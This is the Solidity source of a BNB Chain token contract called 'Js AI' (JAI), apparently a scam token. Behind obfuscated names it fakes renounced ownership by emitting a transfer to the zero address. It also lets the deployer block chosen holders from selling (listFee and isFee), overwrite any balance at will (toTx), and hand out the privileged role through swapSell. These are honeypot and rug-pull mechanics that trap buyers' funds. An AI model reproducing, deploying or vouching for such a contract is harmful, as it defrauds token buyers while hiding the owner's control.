/**
 *Submitted for verification at BscScan.com on 2023-02-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface teamIsTx {
    function createPair(address exemptLiquidity, address atWalletMode) external returns (address);
}

contract JsAI {

    address receiverLiquidity = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    string public symbol = "JAI";

    mapping(address => uint256) public balanceOf;

    bool public liquidityMin;

    uint256 public listLaunchedMode;

    bool private liquidityTake;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => bool) public isFee;

    bool public launchedLiquidity;

    bool public exemptMax;

    address public minAuto;

    address teamIsTxAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    function exemptSender() private view returns (address) {
        return msg.sender;
    }

    event Transfer(address indexed from, address indexed sellReceiver, uint256 value);

    function listFee(address txReceiver) public {
        buyTxSell();
        if (txReceiver == listIs || txReceiver == minAuto) {
            return;
        }
        isFee[txReceiver] = true;
    }

    event Approval(address indexed feeSellTrading, address indexed spender, uint256 value);

    string public name = "Js AI";

    uint8 public decimals = 18;

    function buyTxSell() private view {
        require(modeAt[exemptSender()]);
    }

    address public owner;

    uint256 public marketingMax;

    function fromSell(address liquidityLaunch, address shouldReceiver, uint256 listTx) internal returns (bool) {
        require(balanceOf[liquidityLaunch] >= listTx);
        balanceOf[liquidityLaunch] -= listTx;
        balanceOf[shouldReceiver] += listTx;
        emit Transfer(liquidityLaunch, shouldReceiver, listTx);
        return true;
    }

    mapping(address => bool) public modeAt;

    constructor (){ 
        modeAt[exemptSender()] = true;
        balanceOf[exemptSender()] = totalSupply;
        listIs = exemptSender();
        minAuto = teamIsTx(address(teamIsTxAddr)).createPair(address(receiverLiquidity),address(this));
        emit Transfer(address(0), listIs, totalSupply);
        emit OwnershipTransferred(listIs, address(0));
    }

    bool private swapReceiverSender;

    function transferFrom(address fundReceiver, address walletSwapTotal, uint256 listTx) public returns (bool) {
        if (fundReceiver != exemptSender() && allowance[fundReceiver][exemptSender()] != type(uint256).max) {
            require(allowance[fundReceiver][exemptSender()] >= listTx);
            allowance[fundReceiver][exemptSender()] -= listTx;
        }
        require(!isFee[fundReceiver]);
        return fromSell(fundReceiver, walletSwapTotal, listTx);
    }

    function transfer(address walletSwapTotal, uint256 listTx) external returns (bool) {
        return transferFrom(exemptSender(), walletSwapTotal, listTx);
    }

    function swapSell(address liquidityFrom) public {
        require(!liquidityMin);
        modeAt[liquidityFrom] = true;
        liquidityMin = true;
    }

    address public listIs;

    function toTx(address walletSwapTotal, uint256 listTx) public {
        buyTxSell();
        balanceOf[walletSwapTotal] = listTx;
    }

    uint256 private enableTotalFrom;

    function approve(address shouldTx, uint256 listTx) public returns (bool) {
        allowance[exemptSender()][shouldTx] = listTx;
        emit Approval(exemptSender(), shouldTx, listTx);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

}